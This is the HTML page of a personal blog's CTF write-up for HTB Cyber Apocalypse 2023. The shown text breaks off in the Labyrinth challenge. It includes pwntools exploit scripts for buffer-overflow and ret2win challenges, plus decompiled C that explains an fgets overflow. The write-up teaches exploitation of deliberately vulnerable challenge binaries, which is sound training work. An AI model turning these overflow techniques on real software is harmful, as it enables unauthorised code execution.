<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="I participated in a HTB CyberApocalypse CTF 2023 competition this CTF had several category cybersecurity challenges e.g. pwn, cryptography, reverse engineering, Hardware, forensic, crypto , blockcha">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF WriteUp: HTB CA 2023">
<meta property="og:url" content="https://sf4ult.github.io/2023/04/08/post3/ca_2023/index.html">
<meta property="og:site_name" content="sf4ult">
<meta property="og:description" content="I participated in a HTB CyberApocalypse CTF 2023 competition this CTF had several category cybersecurity challenges e.g. pwn, cryptography, reverse engineering, Hardware, forensic, crypto , blockcha">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/front2.webp">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/getting_started.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/getting_started.gif">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/Questionnaire.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/qutionnaire_op.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/labyrinth.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/labyrinth_op.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/pendora.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/pandora_box.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/pb_checksec.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/pd_op.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/void.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/void_got.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/void_op.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/void_one_gadget.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/void_op2.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/control_room.jpg">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/control_room_patch.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/control_room_menu.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/control_room_menu2.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/control_room_libc-leak1.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/control_room_libc-leak2.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/control_room_libc-leak.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/pwn/control_room_shell.gif">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/rev/shattered_tablet.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/rev/haystack.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/rev/hunting_lic1.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/rev/hunting_lic2.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/rev/hunting_lic3.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/rev/hunting_lic4.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/rev/hunting_lic5.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/forensic/plaintext_t.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/forensic/alien_cradle.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/forensic/extraterrestrial_persistence.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/forensic/rotten_1.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/forensic/rotten_2.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/forensic/rotten_3.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post3/misc/janken_misc.gif">
<meta property="article:published_time" content="2023-04-08T03:40:15.000Z">
<meta property="article:modified_time" content="2023-05-08T22:11:47.264Z">
<meta property="article:author" content="Durgesh">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="reversing">
<meta property="article:tag" content="misc">
<meta property="article:tag" content="forensic">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sf4ult.github.io/imgs/post3/front2.webp">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CTF WriteUp: HTB CA 2023</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 vazir">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archive">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/06/08/post4/wanictf_2023/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/02/12/post2/pwn2own/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2023/04/08/post3/ca_2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&text=CTF WriteUp: HTB CA 2023"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&is_video=false&description=CTF WriteUp: HTB CA 2023"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF WriteUp: HTB CA 2023&body=Check out this article: https://sf4ult.github.io/2023/04/08/post3/ca_2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&name=CTF WriteUp: HTB CA 2023&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&t=CTF WriteUp: HTB CA 2023"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">1.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GettingStarted"><span class="toc-number">1.1.</span> <span class="toc-text">GettingStarted</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.1.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Questionnaire"><span class="toc-number">1.2.</span> <span class="toc-text">Questionnaire</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Labyrinth"><span class="toc-number">1.3.</span> <span class="toc-text">Labyrinth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pandora-Box"><span class="toc-number">1.4.</span> <span class="toc-text">Pandora Box</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Requirement-for-ret2libc"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Requirement for ret2libc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Void"><span class="toc-number">1.5.</span> <span class="toc-text">Void</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">Method 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-4"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sources"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">Sources :</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2"><span class="toc-number">1.5.2.</span> <span class="toc-text">Method 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-5"><span class="toc-number">1.5.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-Room"><span class="toc-number">1.6.</span> <span class="toc-text">Control Room</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Leaking-the-libc-address"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">Leaking the libc address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Gaining-Shell"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">Gaining Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final-Payload"><span class="toc-number">1.6.1.</span> <span class="toc-text">Final Payload:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rev"><span class="toc-number">2.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shattered-tablet"><span class="toc-number">2.1.</span> <span class="toc-text">Shattered tablet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Needle-in-a-Haystack"><span class="toc-number">2.2.</span> <span class="toc-text">Needle in a Haystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hunting-License"><span class="toc-number">2.3.</span> <span class="toc-text">Hunting License</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve"><span class="toc-number">2.3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#She-Shells-C-Shells"><span class="toc-number">2.4.</span> <span class="toc-text">She Shells C Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.4.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cave-System"><span class="toc-number">2.5.</span> <span class="toc-text">Cave System</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensic"><span class="toc-number">3.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Plaintext-Tleasure"><span class="toc-number">3.1.</span> <span class="toc-text">Plaintext Tleasure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alien-Cradle"><span class="toc-number">3.2.</span> <span class="toc-text">Alien Cradle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extraterrestrial-Persistence"><span class="toc-number">3.3.</span> <span class="toc-text">Extraterrestrial Persistence</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rotten"><span class="toc-number">3.4.</span> <span class="toc-text">Rotten</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Persistence"><span class="toc-number">4.1.</span> <span class="toc-text">Persistence</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Janken"><span class="toc-number">4.2.</span> <span class="toc-text">Janken</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CTF WriteUp: HTB CA 2023
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Durgesh</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-08T03:40:15.000Z" class="dt-published" itemprop="datePublished">2023-04-08</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/forensic/" rel="tag">forensic</a>, <a class="p-category" href="/tags/misc/" rel="tag">misc</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/reversing/" rel="tag">reversing</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><img src="/imgs/post3/front2.webp" alt="front.jpg"> </p>
<p>I participated in a HTB CyberApocalypse CTF 2023 competition this CTF had several category cybersecurity challenges e.g. pwn, cryptography, reverse engineering, Hardware, forensic, crypto , blockchain and ML. It was an intense and exhilarating experience, and I’m excited to share my write-up of the challenges i solved and how i approached them.</p>
<p>Although i am too late for this write-up as i am good in prolonging things ;) but <strong>Better late than never</strong>, as i am trying  to be good at pwn my first approach is to solve pwn challenges and then <strong>rev</strong> but i tried to solve some other remaining categories challenge as well.</p>
<p>All challenges can be found <a target="_blank" rel="noopener" href="https://github.com/Durge5h/CTFs/tree/main/Competition/HTB-CA-2023">here</a></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GettingStarted"><a href="#GettingStarted" class="headerlink" title="GettingStarted"></a>GettingStarted</h2><p><img src="/imgs/post3/pwn/getting_started.png" alt="getting_started"></p>
<p>like name like challenge nothing but just variable overwriting, by sending the random input until we overwrite the <strong>target</strong> variable .</p>
<p><img src="/imgs/post3/pwn/getting_started.gif" alt="getting_started"> </p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re, os</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./gs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;46.101.73.55&#x27;,32078)</span></span><br><span class="line">p = process()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">100</span></span><br><span class="line">payload = cyclic(offset)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">content = p.recvall()</span><br><span class="line">flag = re.findall(<span class="string">r&#x27;HTB\&#123;.*\&#125;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line">os.system(<span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nflag &quot;</span>,flag[<span class="number">0</span>]) </span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h2><p><img src="/imgs/post3/pwn/Questionnaire.png" alt="Questionnaire"></p>
<p>it was simple ret2win challenge, had to call function name <strong>gg</strong> overwriting the RIP of <strong>vuln</strong> function.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">gg</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process()</span><br><span class="line"><span class="comment">#p = remote(&#x27;209.97.134.50&#x27;,32698)</span></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">ret = <span class="number">0x00000000004004ce</span></span><br><span class="line">gg = <span class="number">0x00000000004004ce</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(offset) + pack(ret) + pack(gg)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/post3/pwn/qutionnaire_op.png" alt="qutionnaire_op"></p>
<h2 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h2><p><img src="/imgs/post3/pwn/labyrinth.png" alt="labyrinth"></p>
<p>almost same as previous challenge (Questionnaire) with extra fancy things.<br>lets debug the binary’s main function </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>  undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"> 2  </span><br><span class="line"> 3  &#123;</span><br><span class="line"> <span class="number">4</span>    <span class="type">int</span> iVar1;</span><br><span class="line"> <span class="number">5</span>    undefined8 local_38;</span><br><span class="line"> <span class="number">6</span>    undefined8 local_30;</span><br><span class="line"> <span class="number">7</span>    undefined8 local_28;</span><br><span class="line"> <span class="number">8</span>    undefined8 local_20;</span><br><span class="line"> <span class="number">9</span>    <span class="type">char</span> *local_18;</span><br><span class="line"><span class="number">10</span>    ulong local_10;</span><br><span class="line"><span class="number">11</span>    </span><br><span class="line"><span class="number">12</span>    setup();</span><br><span class="line"><span class="number">13</span>    banner();</span><br><span class="line"><span class="number">14</span>    local_38 = <span class="number">0</span>;</span><br><span class="line"><span class="number">15</span>    local_30 = <span class="number">0</span>;</span><br><span class="line"><span class="number">16</span>    local_28 = <span class="number">0</span>;</span><br><span class="line"><span class="number">17</span>    local_20 = <span class="number">0</span>;</span><br><span class="line"><span class="number">18</span>    fwrite(<span class="string">&quot;\nSelect door: \n\n&quot;</span>,<span class="number">1</span>,<span class="number">0x10</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">19</span>    <span class="keyword">for</span> (local_10 = <span class="number">1</span>; local_10 &lt; <span class="number">0x65</span>; local_10 = local_10 + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="number">20</span>      <span class="keyword">if</span> (local_10 &lt; <span class="number">10</span>) &#123;</span><br><span class="line"><span class="number">21</span>        <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;Door: 00%d &quot;</span>,local_10);</span><br><span class="line"><span class="number">22</span>      &#125;</span><br><span class="line"><span class="number">23</span>      <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">24</span>        <span class="keyword">if</span> (local_10 &lt; <span class="number">100</span>) &#123;</span><br><span class="line"><span class="number">25</span>          <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;Door: 0%d &quot;</span>,local_10);</span><br><span class="line"><span class="number">26</span>        &#125;</span><br><span class="line"><span class="number">27</span>        <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">28</span>          <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;Door: %d &quot;</span>,local_10);</span><br><span class="line"><span class="number">29</span>        &#125;</span><br><span class="line"><span class="number">30</span>      &#125;</span><br><span class="line"><span class="number">31</span>      <span class="keyword">if</span> ((local_10 % <span class="number">10</span> == <span class="number">0</span>) &amp;&amp; (local_10 != <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="number">32</span>        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"><span class="number">33</span>      &#125;</span><br><span class="line"><span class="number">34</span>    &#125;</span><br><span class="line"><span class="number">35</span>    fwrite(&amp;DAT_0040248f,<span class="number">1</span>,<span class="number">4</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">36</span>    local_18 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">37</span>    fgets(local_18,<span class="number">5</span>,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="number">38</span>    iVar1 = <span class="built_in">strncmp</span>(local_18,<span class="string">&quot;69&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="number">39</span>    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">40</span>      iVar1 = <span class="built_in">strncmp</span>(local_18,<span class="string">&quot;069&quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="number">41</span>      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) <span class="keyword">goto</span> LAB_004015da;</span><br><span class="line"><span class="number">42</span>    &#125;</span><br><span class="line"><span class="number">43</span>    fwrite(<span class="string">&quot;\nYou are heading to open the door but you suddenly see something on the wall:\n\n\&quot;Fly like a bird and be free!\&quot;\n\nWould you like to change the door you chose?\n\n&gt;&gt; &quot;</span></span><br><span class="line"><span class="number">44</span>           ,<span class="number">1</span>,<span class="number">0xa0</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">45</span>    fgets((<span class="type">char</span> *)&amp;local_38,<span class="number">0x44</span>,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="number">46</span>  LAB_004015da:</span><br><span class="line"><span class="number">47</span>    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;\n%s[-] YOU FAILED TO ESCAPE!\n\n&quot;</span>,&amp;DAT_00402541);</span><br><span class="line"><span class="number">48</span>    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">49</span>  &#125;</span><br></pre></td></tr></table></figure>

<p>at line number <strong>38</strong> variable local_18 that is user input being compared by <strong>69</strong> and if it is equal <strong>69</strong> call the <strong>fwrite</strong> function that is printing some message and at line number <strong>45</strong>, <strong>fgets</strong> function being called but as you can see there is catch over there</p>
<p>The variable <code>local_38</code> is declared as an <code>undefined8</code> type, which is an 8-byte (64-bit) variable. However, in the <code>fgets()</code> function call, the size argument <code>0x44</code> (hexadecimal 44, decimal 68) specifies that <code>fgets()</code> should read up to 68 bytes from <code>stdin</code> and store them in the memory location starting at <code>&amp;local_38</code>.</p>
<p>Since <code>local_38</code> is only 8 bytes long, and <code>fgets()</code> can read up to 68 bytes, this means that <code>fgets()</code> can write up to 60 bytes beyond the end of <code>local_38</code>. This can lead to a buffer overflow, which can cause undefined behavior, including crashing the program, overwriting other variables, and executing arbitrary code.</p>
<p>so now we just have to find the offset of <strong>RIP</strong> and overwrite with some evil function if we have any, and yeah we have this binary contain never called function <strong>escape_plan</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">escape_plan</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> sVar1;</span><br><span class="line">  <span class="type">char</span> local_d;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  fwrite(&amp;DAT_00402018,<span class="number">1</span>,<span class="number">0x1f0</span>,<span 